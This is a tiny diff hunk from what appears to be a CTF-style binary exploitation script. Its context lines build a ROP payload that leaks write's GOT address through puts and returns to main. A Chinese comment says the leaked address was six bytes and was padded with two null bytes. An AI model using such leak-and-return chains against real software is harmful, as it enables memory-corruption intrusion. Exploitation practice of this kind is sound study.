@@ -115,7 +115,6 @@ payload += p64(pop_rdi_addr)
 payload += p64(elf.got['write'])
 payload += p64(elf.plt['puts'])
 payload += p64(elf.symbols['main']) 
-
 '''
 结果调试的时候发现地址只输出6个宽字节，一直少两位，调试发现就是6位，用\x00\x00补齐成功。
 
